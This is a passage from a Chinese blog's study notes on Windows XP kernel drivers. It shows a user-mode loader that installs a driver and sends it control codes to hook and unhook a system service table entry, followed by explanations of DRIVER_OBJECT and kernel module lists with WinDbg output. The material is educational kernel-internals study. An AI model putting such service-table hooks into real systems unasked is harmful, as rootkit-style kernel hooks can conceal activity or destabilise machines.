class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;打开服务控制管理器成功.\n&quot;</span>);</span><br><span class="line">	<span class="comment">// 创建驱动服务</span></span><br><span class="line">	SC_HANDLE hServiceDDK = <span class="literal">NULL</span>; <span class="comment">// NT驱动程序服务句柄</span></span><br><span class="line">	hServiceDDK = CreateServiceW(</span><br><span class="line">		hServiceMgr,</span><br><span class="line">		lpszDriverName,</span><br><span class="line">		lpszDriverName,</span><br><span class="line">		SERVICE_ALL_ACCESS,</span><br><span class="line">		SERVICE_KERNEL_DRIVER,</span><br><span class="line">		SERVICE_DEMAND_START,</span><br><span class="line">		SERVICE_ERROR_IGNORE,</span><br><span class="line">		szDriverFullPath,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == hServiceDDK)</span><br><span class="line">	&#123;</span><br><span class="line">		DWORD dwErr = GetLastError();</span><br><span class="line">		<span class="keyword">if</span> (dwErr != ERROR_IO_PENDING &amp;&amp; dwErr != ERROR_SERVICE_EXISTS)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;创建驱动服务失败, %d\n&quot;</span>, dwErr);</span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;创建驱动服务成功.\n&quot;</span>);</span><br><span class="line">	DWORD dwErr = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// 驱动服务已经创建，打开服务</span></span><br><span class="line">	hServiceDDK = OpenServiceW(hServiceMgr,lpszDriverName,SERVICE_ALL_ACCESS);</span><br><span class="line">	dwErr = GetLastError();</span><br><span class="line">	<span class="comment">//printf(&quot;%d\n&quot;, dwErr);</span></span><br><span class="line">	<span class="keyword">if</span> (!StartService(hServiceDDK, <span class="literal">NULL</span>, <span class="literal">NULL</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		dwErr = GetLastError();</span><br><span class="line">		<span class="keyword">if</span> (dwErr != ERROR_SERVICE_ALREADY_RUNNING)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;运行驱动服务失败, %d\n&quot;</span>, dwErr);</span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;运行驱动服务成功.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (hServiceDDK)</span><br><span class="line">	&#123;</span><br><span class="line">		CloseServiceHandle(hServiceDDK);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (hServiceMgr)</span><br><span class="line">	&#123;</span><br><span class="line">		CloseServiceHandle(hServiceMgr);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RunHOOKDriver</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hDevice = CreateFileW(DRIVER_LINK, GENERIC_READ|GENERIC_WRITE,<span class="number">0</span>,<span class="number">0</span>,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;创建设备失败. %d\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 要HOOK的系统服务号</span></span><br><span class="line">	BYTE InBuffer[<span class="number">8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	DWORD OutBuffer;</span><br><span class="line">	DWORD dwOut = <span class="number">0</span>;</span><br><span class="line">	DeviceIoControl(hDevice,OPHOOK,InBuffer,<span class="number">4</span>,&amp;OutBuffer,<span class="number">4</span>,&amp;dwOut,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;从0环的返回码：%d\n&quot;</span>,OutBuffer);</span><br><span class="line">	<span class="keyword">if</span>(OutBuffer == <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;HOOK成功.\n&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;HOOK失败.\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 关闭设备</span></span><br><span class="line">	CloseHandle(hDevice);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">UnLoadDriver</span><span class="params">(PCWSTR lpszDriverName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	SC_HANDLE hServiceMgr = OpenSCManagerW(<span class="number">0</span>,<span class="number">0</span>,SC_MANAGER_ALL_ACCESS);</span><br><span class="line">	SC_HANDLE hServiceDDK = OpenServiceW(hServiceMgr,lpszDriverName,SERVICE_ALL_ACCESS);</span><br><span class="line">	SERVICE_STATUS SvrStatus;</span><br><span class="line">	ControlService(hServiceDDK,SERVICE_CONTROL_STOP,&amp;SvrStatus);</span><br><span class="line">	DeleteService(hServiceDDK);</span><br><span class="line">	<span class="keyword">if</span> (hServiceDDK)</span><br><span class="line">	&#123;</span><br><span class="line">		CloseServiceHandle(hServiceDDK);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (hServiceMgr)</span><br><span class="line">	&#123;</span><br><span class="line">		CloseServiceHandle(hServiceMgr);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">UnHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hDevice = CreateFileW(DRIVER_LINK, GENERIC_READ|GENERIC_WRITE,<span class="number">0</span>,<span class="number">0</span>,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,<span class="number">0</span>);</span><br><span class="line">	DWORD bRet;</span><br><span class="line">	<span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;UnHook失败.\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	DeviceIoControl(hDevice,OPUNHOOK,<span class="literal">NULL</span>,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="number">0</span>,&amp;bRet,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">// 关闭设备</span></span><br><span class="line">	CloseHandle(hDevice);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// win32k.sys系统服务表挂物理页，没有这行在0环的代码可能会使电脑蓝屏</span></span><br><span class="line">	HWND hwnd = FindWindowA(<span class="literal">NULL</span>,<span class="string">&quot;notepad.exe&quot;</span>); </span><br><span class="line">	<span class="keyword">if</span> (!LoadDriver(DRIVER_NAME, DRIVER_PATH))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;加载驱动失败.\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;本程序仅用于XP 32bit环境，Sys驱动请放到和本程序相同的目录下，且不要改驱动文件名！\n按回车开始HOOK...\n&quot;</span>);</span><br><span class="line">	RunHOOKDriver();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;按回车开始卸载UNHOOK...\n&quot;</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	UnHook();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;按回车开始卸载HOOK...\n&quot;</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	UnLoadDriver(DRIVER_NAME);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://s2.loli.net/2022/03/16/HFfVG2seUBq7ZOA.png" alt="25.png"></p>
<p>⚠️注意事项：</p>
<ol>
<li><p>在3环程序中，驱动名称<code>DRIVER_NAME</code>和驱动路径<code>DRIVER_PATH</code>名称都要是<code>.sys</code>的名称。</p>
</li>
<li><p>3环的加载程序需要和<code>.sys</code>驱动程序在同一目录下。</p>
</li>
<li><p>3环程序在多次调试后可能会失败卸载驱动，导致<code>StartService()</code>失败，<code>GetLastError()</code>得到<a href="https://docs.microsoft.com/en-us/windows/win32/debug/system-error-codes--0-499-">错误码</a>是2，此时需要用<code>KmdManager.exe</code>对驱动进行卸载。</p>
<p><img data-src="https://s2.loli.net/2022/03/16/lSWoY7TKGIrNU1i.png" alt="26.png"></p>
</li>
<li><p>在VC直接F7、F5运行3环的加载程序可能会一闪而过，这个时候需要在该程序的目录下双击运行该程序（需要先执行步骤3进行卸载再双击）。</p>
</li>
</ol>
<p>注意驱动的调用进程：</p>
<p><img data-src="https://s2.loli.net/2022/03/16/NXGPHqr6nmKhU2S.png" alt="27.png"></p>
<p>上述程序说明，驱动加载后，执行驱动入口代码时，所属进程是系统进程。这和 DeviceIoControl 时情况又有所不同，DeviceIoControl 通信时，所属进程是发起通信的3环程序。</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>API调用</category>
        <category>Windows内核</category>
      </categories>
      <tags>
        <tag>WinXP内核</tag>
        <tag>系统调用</tag>
        <tag>API调用</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows XP 驱动开发（二）</title>
    <url>/post/WinXP-Driver2/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ  ɔ: </p>
<span id="more"></span>

<h2 id="0-驱动相关对象"><a href="#0-驱动相关对象" class="headerlink" title="0 驱动相关对象"></a>0 驱动相关对象</h2><p>驱动通信：</p>
<p>《Windows内核安全与驱动开发》 2.3、2.5、5、10.3.5、13.3、<strong>16.5、16.6</strong></p>
<p>看雪的那两片驱动开发的文章</p>
<p>《内核原理与实现》6</p>
<p>《内核情景分析》 9</p>
<p>《驱动开发详解》 1 4 7 </p>
<h3 id="01-驱动对象"><a href="#01-驱动对象" class="headerlink" title="01 驱动对象"></a>01 驱动对象</h3><div class="note warning"><p>一个<strong>驱动对象</strong>代表了<strong>一个驱动程序</strong>，或者说一个<strong>内核模块</strong>。</p>
</div>

<p>内核对象结构如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DRIVER_OBJECT</span> &#123;</span></span><br><span class="line">    CSHORT Type;</span><br><span class="line">    CSHORT Size;</span><br><span class="line">    PDEVICE_OBJECT DeviceObject;</span><br><span class="line">    ULONG Flags;</span><br><span class="line">    PVOID DriverStart;			<span class="comment">//这个内核模块在内核空间中的开始地址</span></span><br><span class="line">    ULONG DriverSize;			<span class="comment">//这个内核模块在内核空间中的大小</span></span><br><span class="line">    PVOID DriverSection;		<span class="comment">//内核模块链表,指向当前模块的_LDR_DATA_TABLE_ENTRY</span></span><br><span class="line">    PDRIVER_EXTENSION DriverExtension;	<span class="comment">//驱动的扩展信息，可以自定义存放我们的数据（非分页内存，不会被换页，当全局变量用）</span></span><br><span class="line">    UNICODE_STRING DriverName;		<span class="comment">//驱动的名字</span></span><br><span class="line">    PUNICODE_STRING HardwareDatabase;</span><br><span class="line">    PFAST_IO_DISPATCH FastIoDispatch;	<span class="comment">//快速 IO 分发函数</span></span><br><span class="line">    PDRIVER_INITIALIZE DriverInit;</span><br><span class="line">    PDRIVER_STARTIO DriverStartIo;</span><br><span class="line">    PDRIVER_UNLOAD DriverUnload;	<span class="comment">//驱动的卸载地址</span></span><br><span class="line">    PDRIVER_DISPATCH MajorFunction[IRP_MJ_MAXIMUM_FUNCTION + <span class="number">1</span>];	<span class="comment">//普通分发函数</span></span><br><span class="line">&#125; DRIVER_OBJECT;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DRIVER_OBJECT</span> *<span class="title">PDRIVER_OBJECT</span>;</span> </span><br></pre></td></tr></table></figure>

<p>Windbg查看结构：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _DRIVER_OBJECT -v</span><br><span class="line">nt!_DRIVER_OBJECT</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">DRIVER_OBJECT</span>, 15 <span class="title">elements</span>, 0<span class="title">xa8</span> <span class="title">bytes</span></span></span><br><span class="line"><span class="class">   +0<span class="title">x000</span> <span class="title">Type</span>             :</span> Int2B</span><br><span class="line">   +<span class="number">0x002</span> Size             : Int2B</span><br><span class="line">   +<span class="number">0x004</span> DeviceObject     : Ptr32 to <span class="class"><span class="keyword">struct</span> _<span class="title">DEVICE_OBJECT</span>, 25 <span class="title">elements</span>, 0<span class="title">xb8</span> <span class="title">bytes</span></span></span><br><span class="line"><span class="class">   +0<span class="title">x008</span> <span class="title">Flags</span>            :</span> Uint4B</span><br><span class="line">   +<span class="number">0x00c</span> DriverStart      : Ptr32 to Void</span><br><span class="line">   +<span class="number">0x010</span> DriverSize       : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> DriverSection    : Ptr32 to Void</span><br><span class="line">   +<span class="number">0x018</span> DriverExtension  : Ptr32 to <span class="class"><span class="keyword">struct</span> _<span class="title">DRIVER_EXTENSION</span>, 6 <span class="title">elements</span>, 0<span class="title">x1c</span> <span class="title">bytes</span></span></span><br><span class="line"><span class="class">   +0<span class="title">x01c</span> <span class="title">DriverName</span>       :</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span>, 3 <span class="title">elements</span>, 0<span class="title">x8</span> <span class="title">bytes</span></span></span><br><span class="line"><span class="class">   +0<span class="title">x024</span> <span class="title">HardwareDatabase</span> :</span> Ptr32 to <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span>, 3 <span class="title">elements</span>, 0<span class="title">x8</span> <span class="title">bytes</span></span></span><br><span class="line"><span class="class">   +0<span class="title">x028</span> <span class="title">FastIoDispatch</span>   :</span> Ptr32 to <span class="class"><span class="keyword">struct</span> _<span class="title">FAST_IO_DISPATCH</span>, 28 <span class="title">elements</span>, 0<span class="title">x70</span> <span class="title">bytes</span></span></span><br><span class="line"><span class="class">   +0<span class="title">x02c</span> <span class="title">DriverInit</span>       :</span> Ptr32 to     <span class="keyword">long</span> </span><br><span class="line">   +<span class="number">0x030</span> DriverStartIo    : Ptr32 to     <span class="keyword">void</span> </span><br><span class="line">   +<span class="number">0x034</span> DriverUnload     : Ptr32 to     <span class="keyword">void</span> </span><br><span class="line">   +<span class="number">0x038</span> MajorFunction    : [<span class="number">28</span>] Ptr32 to     <span class="keyword">long</span> </span><br></pre></td></tr></table></figure>



<h3 id="02-设备对象"><a href="#02-设备对象" class="headerlink" title="02 设备对象"></a>02 设备对象</h3><p>一个驱动程序可以支持多个设备，所以，驱动程序对象中有一个链表记录了它所负责的所有设备对象。每个设备对象都必定有一个为它负责的驱动程序对设备对象的各种操作实际上是由为它负贵的驱动程序中的例程来完成的。</p>
<h2 id="1-内核空间"><a href="#1-内核空间" class="headerlink" title="1 内核空间"></a>1 内核空间</h2><p>每个进程的低2G都是独立的，而<strong>高2G是共享的</strong>。</p>
<p><img data-src="https://s2.loli.net/2022/01/15/t3rlcvWyaSmH2Go.png" alt="7.png"></p>
<h3 id="1-1-练习：验证高2G内存共享"><a href="#1-1-练习：验证高2G内存共享" class="headerlink" title="1.1 练习：验证高2G内存共享"></a>1.1 练习：验证高2G内存共享</h3><ol>
<li><p>先在驱动程序中定义一个全局变量，获取地址（高2G）。地址为：0xF79F9014。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载函数</span></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT driver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;驱动程序停止运行了\n&quot;</span>);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ULONG ulNum = <span class="number">12345678</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数，相当于main</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;变量ulNum的地址为：[%p]:%08d\n&quot;</span>,&amp;ulNum,ulNum);	</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 设置一个卸载函数，便于退出</span></span><br><span class="line">	driver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://s2.loli.net/2022/01/15/24hLcEGk73zmvIU.png" alt="8.png"></p>
</li>
<li><p>在Windbg使用<code>!process 0 0</code>找任意一个进程的基地址，如DbgView：0x85d9b8d8 ，并使用<code>.process 0x85d9b8d8</code>切换到该进程空间。</p>
<p><img data-src="https://s2.loli.net/2022/01/15/ABvWtlupIbPMjQq.png" alt="9.png"></p>
</li>
<li><p>如下图，得到地址0xF79F9014中值为：0x00bc614e（12345678）。</p>
<p><img data-src="https://s2.loli.net/2022/01/15/gMmRX8V31irBolG.png" alt="10.png"></p>
</li>
</ol>
<h3 id="1-2-内核模块"><a href="#1-2-内核模块" class="headerlink" title="1.2 内核模块"></a>1.2 内核模块</h3><p>高2G里有许多模块，操作系统内核（如101012分页的ntoskrnl.exe）也在其中。接下来的课后试验我们会编程遍历高2G模块。</p>
<p>内核模块一般是<code>.sys</code>，也可以是其他格式，他们都遵循PE格式。我们经常说“驱动”，这个名字的来源其实是内核程序入口函数的参数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path)</span></span>;</span><br></pre></td></tr></table></figure>

<p><code>PDRIVER_OBJECT</code>驱动对象，就是驱动这个名字的由来。</p>
<ul>
<li><code>driver</code>：指向当前模块的DRIVER_OBJECT。</li>
<li><code>reg_path</code>：将当前模块注册到注册表哪个位置。</li>
</ul>
<ol>
<li><p>硬件种类繁多，不可能做一个兼容所有硬件的内核，所以，微软提供规定的接口格式，让硬件驱动人员安装规定的格式编写“驱动程序” 。</p>
</li>
<li><p>这些驱动程序每一个都是一个模块，称为“内核模块”，都可以加载到内核中，都遵守PE结构。但本质上讲，任意一个<code>.sys</code>文件与内核文件没有区别。</p>
<p><img data-src="https://s2.loli.net/2022/01/15/6jAEl5kP7TI1gGO.png" alt="11.png"></p>
</li>
</ol>
<h3 id="1-3-DRIVER-OBJECT-结构体"><a href="#1-3-DRIVER-OBJECT-结构体" class="headerlink" title="1.3 DRIVER_OBJECT 结构体"></a>1.3 DRIVER_OBJECT 结构体</h3><p>DRIVER_OBJECT为一个结构体，<strong>每个内核模块都有一个这样对应的结构体，来描述这个模块在内核中的：位置、大小、名称等等</strong>。</p>
<div class="note warning"><p>结构体DRIVER_OBJECT主要目的就是描述当前的这个模块，或者叫做驱动对象。</p>
<p><mark class="label danger">模块</mark>：<strong>驱动对象</strong>。</p>
</div>

<p>该结构在VS2010的<code>wdm.h</code>及<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object#:~:text=Each%20driver%20object%20represents%20the%20image%20of%20a,if%20any.%20A%20driver%20object%20is%20partially%20opaque.">MSDN</a>中的定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DRIVER_OBJECT</span> &#123;</span></span><br><span class="line">    CSHORT Type;</span><br><span class="line">    CSHORT Size;</span><br><span class="line">    PDEVICE_OBJECT DeviceObject;</span><br><span class="line">    ULONG Flags;</span><br><span class="line">    PVOID DriverStart;			<span class="comment">//驱动对象的起始地址</span></span><br><span class="line">    ULONG DriverSize;			<span class="comment">//驱动对象的大小</span></span><br><span class="line">    PVOID DriverSection;		<span class="comment">//内核模块链表,指向当前模块的_LDR_DATA_TABLE_ENTRY</span></span><br><span class="line">    PDRIVER_EXTENSION DriverExtension;	<span class="comment">//驱动的扩展信息，可以自定义存放我们的数据（非分页内存，不会被换页，当全局变量用）</span></span><br><span class="line">    UNICODE_STRING DriverName;		<span class="comment">//驱动对象的名字</span></span><br><span class="line">    PUNICODE_STRING HardwareDatabase;</span><br><span class="line">    PFAST_IO_DISPATCH FastIoDispatch;</span><br><span class="line">    PDRIVER_INITIALIZE DriverInit;</span><br><span class="line">    PDRIVER_STARTIO DriverStartIo;</span><br><span class="line">    PDRIVER_UNLOAD DriverUnload;	<span class="comment">//驱动对象的卸载地址</span></span><br><span class="line">    PDRIVER_DISPATCH MajorFunction[IRP_MJ_MAXIMUM_FUNCTION + <span class="number">1</span>];</span><br><span class="line">&#125; DRIVER_OBJECT;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DRIVER_OBJECT</span> *<span class="title">PDRIVER_OBJECT</span>;</span> </span><br></pre></td></tr></table></figure>

<p>几个重要的属性：</p>
<p>DriverStart：驱动在内存中的基址。<br>DriverSize：驱动在内存中的大小。<br><strong>DriverSection</strong>：内核模块链表基址。<code>_LDR_DATA_TABLE_ENTRY</code><br>DriverName：驱动（模块）名称。</p>
<p>在Windbg中查看该结构：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _DRIVER_OBJECT</span><br><span class="line">ntdll!_DRIVER_OBJECT</span><br><span class="line">   +<span class="number">0x000</span> Type             : Int2B	<span class="comment">//2B = 2Byte(SHORT)</span></span><br><span class="line">   +<span class="number">0x002</span> Size             : Int2B</span><br><span class="line">   +<span class="number">0x004</span> DeviceObject     : Ptr32 _DEVICE_OBJECT</span><br><span class="line">   +<span class="number">0x008</span> Flags            : Uint4B</span><br><span class="line">   +<span class="number">0x00c</span> DriverStart      : Ptr32 Void	<span class="comment">//Ptr32：32位的指针类型</span></span><br><span class="line">   +<span class="number">0x010</span> DriverSize       : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> DriverSection    : Ptr32 Void</span><br><span class="line">   +<span class="number">0x018</span> DriverExtension  : Ptr32 _DRIVER_EXTENSION</span><br><span class="line">   +<span class="number">0x01c</span> DriverName       : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x024</span> HardwareDatabase : Ptr32 _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x028</span> FastIoDispatch   : Ptr32 _FAST_IO_DISPATCH</span><br><span class="line">   +<span class="number">0x02c</span> DriverInit       : Ptr32     <span class="keyword">long</span> </span><br><span class="line">   +<span class="number">0x030</span> DriverStartIo    : Ptr32     <span class="keyword">void</span> </span><br><span class="line">   +<span class="number">0x034</span> DriverUnload     : Ptr32     <span class="keyword">void</span> </span><br><span class="line">   +<span class="number">0x038</span> MajorFunction    : [<span class="number">28</span>] Ptr32     <span class="keyword">long</span> </span><br></pre></td></tr></table></figure>

<p>获取当前驱动入口函数第一个参数PDRIVER_OBJECT的值（是一个结构体指针）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载函数</span></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT driver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;驱动程序停止运行了.\r\n&quot;</span>);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数，相当于main</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	DbgPrint(<span class="string">&quot;PDRIVER_OBJECT: %08X,%wZ\n&quot;</span>,driver,reg_path);</span><br><span class="line">	<span class="comment">// 设置一个卸载函数，便于退出</span></span><br><span class="line">	driver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>DbgPrint输出格式可参见：<a href="https://blog.csdn.net/qq750509600/article/details/79630453">DbgPrint输出格式</a></p>
<ul>
<li>%Z ：ANSI_STRING字符串，注意输出时需要用<code>&amp;</code>取字符串的地址。</li>
<li>%wZ：UNICODE_STRING字符串，注意输出时需要用<code>&amp;</code>取字符串的地址。</li>
</ul>
<p><img data-src="https://s2.loli.net/2022/01/15/NtnP37CxT65okGB.png" alt="12.png"></p>
<p>如图，结构体_DRIVER_OBJECT的起始地址为：0x85EA8BC0。在windbg中查看这个驱动进程的 _DRIVER_OBJECT 结构体：<code>dt _DRIVER_OBJECT 85EA8BC0</code></p>
<p>指令： dt _DRIVER_OBJECT  地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _DRIVER_OBJECT <span class="number">85</span>EA8BC0</span><br><span class="line">ntdll!_DRIVER_OBJECT</span><br><span class="line">   +<span class="number">0x000</span> Type             : <span class="number">0</span>n4</span><br><span class="line">   +<span class="number">0x002</span> Size             : <span class="number">0</span>n168</span><br><span class="line">   +<span class="number">0x004</span> DeviceObject     : (null) </span><br><span class="line">   +<span class="number">0x008</span> Flags            : <span class="number">0x12</span></span><br><span class="line">   +<span class="number">0x00c</span> DriverStart      : <span class="number">0xf789e000</span> Void</span><br><span class="line">   +<span class="number">0x010</span> DriverSize       : <span class="number">0x6000</span></span><br><span class="line">   +<span class="number">0x014</span> DriverSection    : <span class="number">0x863064b0</span> Void</span><br><span class="line">   +<span class="number">0x018</span> DriverExtension  : <span class="number">0x85ea8c68</span> _DRIVER_EXTENSION</span><br><span class="line">   +<span class="number">0x01c</span> DriverName       : _UNICODE_STRING <span class="string">&quot;\Driver\0115_2_输出参数PDRIVER_OBJECT&quot;</span></span><br><span class="line">   +<span class="number">0x024</span> HardwareDatabase : <span class="number">0x8067e260</span> _UNICODE_STRING <span class="string">&quot;\REGISTRY\MACHINE\HARDWARE\DESCRIPTION\SYSTEM&quot;</span></span><br><span class="line">   +<span class="number">0x028</span> FastIoDispatch   : (null) </span><br><span class="line">   +<span class="number">0x02c</span> DriverInit       : <span class="number">0xf789f020</span>     <span class="keyword">long</span>  <span class="number">0115</span>_2_!DriverEntry+<span class="number">0</span></span><br><span class="line">   +<span class="number">0x030</span> DriverStartIo    : (null) </span><br><span class="line">   +<span class="number">0x034</span> DriverUnload     : <span class="number">0xf789f000</span>     <span class="keyword">void</span>  <span class="number">0115</span>_2_!DriverUnload+<span class="number">0</span></span><br><span class="line">   +<span class="number">0x038</span> MajorFunction    : [<span class="number">28</span>] <span class="number">0x804f5552</span>     <span class="keyword">long</span>  nt!IopInvalidDeviceRequest+<span class="number">0</span></span><br></pre></td></tr></table></figure>

<h3 id="1-4-遍历内核模块"><a href="#1-4-遍历内核模块" class="headerlink" title="1.4 遍历内核模块"></a>1.4 遍历内核模块</h3><p>我们可以根据_DRIVER_OBJECT结构的DriverSection（内核模块链表）属性来获取0环所有的内核模块。它实际上是 <code>_LDR_DATA_TABLE_ENTRY</code>结构类型。</p>
<div class="note danger"><p><mark class="label success">双向循环链表</mark></p>
<p><strong>0环所有模块的<code>_LDR_DATA_TABLE_ENTRY</code>是一个双向循环链表</strong>。结构<code>_LDR_DATA_TABLE_ENTRY</code>存储当前模块的信息。</p>
</div>

<p>DriverSection 属性类型为<code>PVOID</code>的链表指针，该指针指向的结构为<strong>当前模块的</strong><code>_LDR_DATA_TABLE_ENTRY</code>：</p>
